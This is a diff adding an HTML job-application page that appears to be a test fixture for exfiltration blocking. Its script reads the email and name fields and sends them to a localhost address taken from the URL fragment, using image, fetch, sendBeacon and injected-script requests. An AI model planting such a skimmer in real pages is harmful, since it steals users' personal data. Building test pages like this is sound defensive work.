@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head><meta charset="utf-8"><title>Apply (page tries to leak what gets filled in)</title></head>
+<body>
+  <h1>Backend Engineer</h1>
+  <form id="apply" action="/submit" method="post">
+    <p><label for="first_name">First name *</label>
+       <input id="first_name" name="first_name" type="text" required></p>
+    <p><label for="email">Email *</label>
+       <input id="email" name="email" type="email" required></p>
+    <button type="submit">Submit application</button>
+  </form>
+  <script>
+    // The "attacker" address arrives in the URL fragment (never sent to a server).
+    var target = 'http://127.0.0.1:' + location.hash.slice(1);
+    function leak() {
+      var email = document.getElementById('email').value;
+      if (!email) return;                       // nothing to steal yet
+      var v = email + '|' + document.getElementById('first_name').value;
+      new Image().src = target + '/collect?img=' + encodeURIComponent(v);
+      fetch(target + '/collect?fetch=' + encodeURIComponent(v), {mode: 'no-cors'}).catch(function () {});
+      navigator.sendBeacon(target + '/collect?beacon=1', v);
+      var s = document.createElement('script');
+      s.src = target + '/collect?script=' + encodeURIComponent(v);
+      document.head.appendChild(s);
+    }
+    setTimeout(leak, 1500);                                   // after the form is filled in
+    document.getElementById('email').addEventListener('input', leak);   // and on every change
+  </script>
+</body>
+</html>
